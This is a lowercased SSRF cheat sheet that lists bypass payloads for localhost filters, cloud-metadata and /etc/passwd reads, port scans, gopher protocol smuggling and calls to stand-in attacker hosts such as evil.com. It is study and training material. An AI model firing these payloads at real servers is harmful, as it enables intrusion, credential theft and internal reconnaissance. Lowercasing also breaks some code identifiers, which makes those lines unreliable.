# server-side request forgery

> server side request forgery or ssrf is a vulnerability in which an attacker forces a server to perform requests on their behalf.


## summary

* [tools](#tools)
* [methodology](#methodology)
* [bypassing filters](#bypassing-filters)
    * [default targets](#default-targets)
    * [bypass localhost with ipv6 notation](#bypass-localhost-with-ipv6-notation)
    * [bypass localhost with a domain redirect](#bypass-localhost-with-a-domain-redirect)
    * [bypass localhost with cidr](#bypass-localhost-with-cidr)
    * [bypass using rare address](#bypass-using-rare-address)
    * [bypass using an encoded ip address](#bypass-using-an-encoded-ip-address)
    * [bypass using different encoding](#bypass-using-different-encoding)
    * [bypassing using a redirect](#bypassing-using-a-redirect)
    * [bypass using dns rebinding](#bypass-using-dns-rebinding)
    * [bypass abusing url parsing discrepancy](#bypass-abusing-url-parsing-discrepancy)
    * [bypass php filter_var() function](#bypass-php-filter_var-function)
    * [bypass using jar scheme](#bypass-using-jar-scheme)
* [exploitation via url scheme](#exploitation-via-url-scheme)
    * [file://](#file)
    * [http://](#http)
    * [dict://](#dict)
    * [sftp://](#sftp)
    * [tftp://](#tftp)
    * [ldap://](#ldap)
    * [gopher://](#gopher)
    * [netdoc://](#netdoc)
* [blind exploitation](#blind-exploitation)
* [upgrade to xss](#upgrade-to-xss)
* [labs](#labs) 
* [references](#references)


## tools

- [swisskyrepo/ssrfmap](https://github.com/swisskyrepo/ssrfmap) - automatic ssrf fuzzer and exploitation tool
- [tarunkant/gopherus](https://github.com/tarunkant/gopherus) - generates gopher link for exploiting ssrf and gaining rce in various servers
- [in3tinct/see-surf](https://github.com/in3tinct/see-surf) - python based scanner to find potential ssrf parameters
- [teknogeek/ssrf-sheriff](https://github.com/teknogeek/ssrf-sheriff) - simple ssrf-testing sheriff written in go
- [assetnote/surf](https://github.com/assetnote/surf) - returns a list of viable ssrf candidates
- [dwisiswant0/ipfuscator](https://github.com/dwisiswant0/ipfuscator) - a blazing-fast, thread-safe, straightforward and zero memory allocations tool to swiftly generate alternative ip(v4) address representations in go.
- [horlad/r3dir](https://github.com/horlad/r3dir) - a redirection service designed to help bypass ssrf filters that do not validate the redirect location. intergrated with burp with help of hackvertor tags


## methodology

ssrf is a security vulnerability that occurs when an attacker manipulates a server to make http requests to an unintended location. this happens when the server processes user-provided urls or ip addresses without proper validation.

common exploitation paths:

- accessing cloud metadata
- leaking files on the server
- network discovery, port scanning with the ssrf
- sending packets to specific services on the network, usually to achieve a remote command execution on another server


**example**: a server accepts user input to fetch a url.

```py
url = input("enter url:")
response = requests.get(url)
return response
```

an attacker supplies a malicious input:

```ps1
http://169.254.169.254/latest/meta-data/
```

this fetches sensitive information from the aws ec2 metadata service.


## bypassing filters

### default targets

by default, server-side request forgery are used to access services hosted on `localhost` or hidden further on the network.

* using `localhost`
  ```powershell
  http://localhost:80
  http://localhost:22
  https://localhost:443
  ```
* using `127.0.0.1`
  ```powershell
  http://127.0.0.1:80
  http://127.0.0.1:22
  https://127.0.0.1:443
  ```
* using `0.0.0.0`
  ```powershell
  http://0.0.0.0:80
  http://0.0.0.0:22
  https://0.0.0.0:443
  ```


### bypass localhost with ipv6 notation

* using unspecified address in ipv6 `[::]`
    ```powershell
    http://[::]:80/
    ```

* using ipv6 loopback addres`[0000::1]`
    ```powershell
    http://[0000::1]:80/
    ```

* using [ipv6/ipv4 address embedding](http://www.tcpipguide.com/free/t_ipv6ipv4addressembedding.htm)
    ```powershell
    http://[0:0:0:0:0:ffff:127.0.0.1]
    http://[::ffff:127.0.0.1]
    ```


### bypass localhost with a domain redirect

| domain                       | redirect to |
|------------------------------|-------------|
| localtest.me                 | `::1`       |
| localh.st                    | `127.0.0.1` |
| spoofed.[burp_collaborator]  | `127.0.0.1` |
| spoofed.redacted.oastify.com | `127.0.0.1` |
| company.127.0.0.1.nip.io     | `127.0.0.1` |

the service `nip.io` is awesome for that, it will convert any ip address as a dns.

```powershell
nip.io maps <anything>.<ip address>.nip.io to the corresponding <ip address>, even 127.0.0.1.nip.io maps to 127.0.0.1
```

### bypass localhost with cidr 

the ip range `127.0.0.0/8` in ipv4 is reserved for loopback addresses. 

```powershell
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

if you try to use any address in this range (127.0.0.2, 127.1.1.1, etc.) in a network, it will still resolve to the local machine


### bypass using rare address

you can short-hand ip addresses by dropping the zeros

```powershell
http://0/
http://127.1
http://127.0.1
```


### bypass using an encoded ip address

* decimal ip location
    ```powershell
    http://2130706433/ = http://127.0.0.1
    http://3232235521/ = http://192.168.0.1
    http://3232235777/ = http://192.168.1.1
    http://2852039166/ = http://169.254.169.254
    ```

* octal ip: implementations differ on how to handle octal format of ipv4.
    ```powershell
    http://0177.0.0.1/ = http://127.0.0.1
    http://o177.0.0.1/ = http://127.0.0.1
    http://0o177.0.0.1/ = http://127.0.0.1
    http://q177.0.0.1/ = http://127.0.0.1
    ```


### bypass using different encoding

* url encoding: single or double encode a specific url to bypass blacklist
    ```powershell
    http://127.0.0.1/%61dmin
    http://127.0.0.1/%2561dmin
    ```

* enclosed alphanumeric: `①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿`
    ```powershell
    http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
    ```

* unicode encoding: in some languages (.net, python 3) regex supports unicode by default. `\d` includes `0123456789` but also `๐๑๒๓๔๕๖๗๘๙`.


### bypassing using a redirect

1. create a page on a whitelisted host that redirects requests to the ssrf the target url (e.g. 192.168.0.1)
2. launch the ssrf pointing to `vulnerable.com/index.php?url=http://redirect-server`
3. you can use response codes [http 307](https://developer.mozilla.org/en-us/docs/web/http/status/307) and [http 308](https://developer.mozilla.org/en-us/docs/web/http/status/308) in order to retain http method and body after the redirection.

to perform redirects without hosting own redirect server or perform seemless redirect target fuzzing, use [horlad/r3dir](https://github.com/horlad/r3dir).


* redirects to `http://localhost` with `307 temporary redirect` status code
    ```powershell
    https://307.r3dir.me/--to/?url=http://localhost
    ```

* redirects to `http://169.254.169.254/latest/meta-data/` with `302 found` status code
    ```powershell
    https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
    ```


### bypass using dns rebinding

create a domain that change between two ips. 

* [1u.ms](http://1u.ms) - dns rebinding utility

for example to rotate between `1.2.3.4` and `169.254-169.254`, use the following domain:

```powershell
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

verify the address with `nslookup`.

```ps1
$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
address: 1.2.3.4

$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
address: 169.254.169.254
```


### bypass abusing url parsing discrepancy

[a new era of ssrf exploiting url parser in trending programming languages - research from orange tsai](https://www.blackhat.com/docs/us-17/thursday/us-17-tsai-a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages.pdf)

```powershell
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```


[image extracted text: [image not found]]



parsing behavior by different libraries: `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`

* `urllib2` treats `1.1.1.1` as the destination
* `requests` and browsers redirect to `2.2.2.2`
* `urllib` resolves to `3.3.3.3`



### bypass php filter_var() function

in php 7.0.25, `filter_var()` function with the parameter `filter_validate_url` allows url such as:

- `http://test???test.com`
- `0://evil.com:80;http://google.com:80/ `

```php
<?php 
	echo var_dump(filter_var("http://test???test.com", filter_validate_url));
	echo var_dump(filter_var("0://evil.com;google.com", filter_validate_url));
?>
```


### bypass using jar scheme

this attack technique is fully blind, you won't see the result.

```powershell
jar:scheme://domain/path!/ 
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
```

## exploitation via url scheme

### file

allows an attacker to fetch the content of a file on the server. transforming the ssrf into a file read.

```powershell
file:///etc/passwd
file://\/\/etc/passwd
```

### http

allows an attacker to fetch any content from the web, it can also be used to scan ports.

```powershell
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
```


[image extracted text: [image not found]]



### dict

the dict url scheme is used to refer to definitions or word lists available using the dict protocol:

```powershell
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

### sftp 

a network protocol used for secure file transfer over secure shell

```powershell
ssrf.php?url=sftp://evil.com:11111/
```

### tftp

trivial file transfer protocol, works over udp

```powershell
ssrf.php?url=tftp://evil.com:12346/testudppacket
```

### ldap

lightweight directory access protocol. it is an application protocol used over an ip network to manage and access the distributed directory information service.

```powershell
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```


### netdoc

wrapper for java when your payloads struggle with "`\n`" and "`\r`" characters.

```powershell
ssrf.php?url=netdoc:///etc/passwd
```


### gopher

the `gopher://` protocol is a lightweight, text-based protocol that predates the modern world wide web. it was designed for distributing, searching, and retrieving documents over the internet.

```ps1
gopher://[host]:[port]/[type][selector]
```

this scheme is very useful as it as be used to send data to tcp protocol.

```ps1
gopher://localhost:25/_mail%20from:<attacker@example.com>%0d%0a
```

refer to the ssrf advanced exploitation to explore the `gopher://` protocol deeper.


## blind exploitation

> when exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read. 

use an ssrf chain to gain an out-of-band output: [assetnote/blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains)

**possible via http(s)**

- [elasticsearch](https://github.com/assetnote/blind-ssrf-chains#elasticsearch)
- [weblogic](https://github.com/assetnote/blind-ssrf-chains#weblogic)
- [hashicorp consul](https://github.com/assetnote/blind-ssrf-chains#consul)
- [shellshock](https://github.com/assetnote/blind-ssrf-chains#shellshock)
- [apache druid](https://github.com/assetnote/blind-ssrf-chains#druid)
- [apache solr](https://github.com/assetnote/blind-ssrf-chains#solr)
- [peoplesoft](https://github.com/assetnote/blind-ssrf-chains#peoplesoft)
- [apache struts](https://github.com/assetnote/blind-ssrf-chains#struts)
- [jboss](https://github.com/assetnote/blind-ssrf-chains#jboss)
- [confluence](https://github.com/assetnote/blind-ssrf-chains#confluence)
- [jira](https://github.com/assetnote/blind-ssrf-chains#jira)
- [other atlassian products](https://github.com/assetnote/blind-ssrf-chains#atlassian-products)
- [opentsdb](https://github.com/assetnote/blind-ssrf-chains#opentsdb)
- [jenkins](https://github.com/assetnote/blind-ssrf-chains#jenkins)
- [hystrix dashboard](https://github.com/assetnote/blind-ssrf-chains#hystrix)
- [w3 total cache](https://github.com/assetnote/blind-ssrf-chains#w3)
- [docker](https://github.com/assetnote/blind-ssrf-chains#docker)
- [gitlab prometheus redis exporter](https://github.com/assetnote/blind-ssrf-chains#redisexporter)

**possible via gopher**

- [redis](https://github.com/assetnote/blind-ssrf-chains#redis)
- [memcache](https://github.com/assetnote/blind-ssrf-chains#memcache)
- [apache tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat)


## upgrade to xss

when the ssrf doesn't have any critical impact, the network is segmented and you can't reach other machine, the ssrf doesn't allow you to exfiltrate files from the server.

you can try to upgrade the ssrf to an xss, by including an svg file containing javascript code.

```bash
https://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg
```


## labs

* [portswigger - basic ssrf against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
* [portswigger - basic ssrf against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
* [portswigger - ssrf with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
* [portswigger - ssrf with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
* [portswigger - ssrf with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
* [root me - server side request forgery](https://www.root-me.org/en/challenges/web-server/server-side-request-forgery)
* [root me - nginx - ssrf misconfiguration](https://www.root-me.org/en/challenges/web-server/nginx-ssrf-misconfiguration)


## references

- [a new era of ssrf - exploiting url parsers - orange tsai - september 27, 2017](https://www.youtube.com/watch?v=d1s-g8rjrek)
- [blind ssrf on errors.hackerone.net - chaosbolt - june 30, 2018](https://hackerone.com/reports/374737)
- [esea server-side request forgery and querying aws meta data - brett buerhaus - april 18, 2016](http://buer.haus/2016/04/18/esea-server-side-request-forgery-and-querying-aws-meta-data/)
- [hacker101 ssrf - cody brocious - october 29, 2018](https://www.youtube.com/watch?v=66ni2btijs8)
- [hackerone - how to: server-side request forgery (ssrf) - jobert abma - june 14, 2017](https://www.hackerone.com/blog-how-to-server-side-request-forgery-ssrf)
- [hacking the hackers: leveraging an ssrf in hackertarget - @sxcurity - december 17, 2017](http://web.archive.org/web/20171220083457/http://www.sxcurity.pro/2017/12/17/hackertarget/)
- [how i chained 4 vulnerabilities on github enterprise, from ssrf execution chain to rce! - orange tsai - july 28, 2017](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
- [les server side request forgery : comment contourner un pare-feu - geluchat - september 16, 2017](https://www.dailysecurity.fr/server-side-request-forgery/)
- [php ssrf - @secjuice - themiddle - march 1, 2018](https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51)
- [piercing the veil: server side request forgery to niprnet access - alyssa herrera - april 9, 2018](https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a)
- [server-side browsing considered harmful - nicolas grégoire (agarri) - may 21, 2015](https://www.agarri.fr/docs/appseceu15-server_side_browsing_considered_harmful.pdf)
- [ssrf - server-side request forgery (types and ways to exploit it) part-1 - san thosh (madrobot) - january 10, 2019](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978)
- [ssrf and local file read in video to gif converter - sl1m - february 11, 2016](https://hackerone.com/reports/115857)
- [ssrf in https://imgur.com/vidgif/url - eugene farfel (aesteral) - february 10, 2016](https://hackerone.com/reports/115748)
- [ssrf in proxy.duckduckgo.com - patrik fábián (fpatrik) - may 27, 2018](https://hackerone.com/reports/358119)
- [ssrf on *shopifycloud.com - rojan rijal (rijalrojan) - july 17, 2018](https://hackerone.com/reports/382612)
- [ssrf protocol smuggling in plaintext credential handlers: ldap - willis vandevanter (@0xrst) - february 5, 2019](https://www.silentrobots.com/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/)
- [ssrf tips - xl7dev - july 3, 2016](http://web.archive.org/web/20170407053309/http://blog.safebuff.com/2016/07/03/ssrf-tips/)
- [ssrf's up! real world server-side request forgery (ssrf) - alberto wilson and guillermo gabarrin - january 25, 2019](https://www.shorebreaksecurity.com/blog/ssrfs-up-real-world-server-side-request-forgery-ssrf/)
- [ssrf脆弱性を利用したgce/gkeインスタンスへの攻撃例 - mrtc0 - september 5, 2018](https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/)
- [svg ssrf cheatsheet - allan wirth (@allanlw) - june 12, 2019](https://github.com/allanlw/svg-cheatsheet)
- [url eccentricities in java - sammy (@pwnl0rd) - november 2, 2020](http://web.archive.org/web/20201107113541/https://blog.pwnl0rd.me/post/lfi-netdoc-file-java/)
- [web security academy server-side request forgery (ssrf) - portswigger - july 10, 2019](https://portswigger.net/web-security/ssrf)
- [x-ctf finals 2016 - john slick (web 25) - yeo quan yang (@quanyang) - june 22, 2016](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)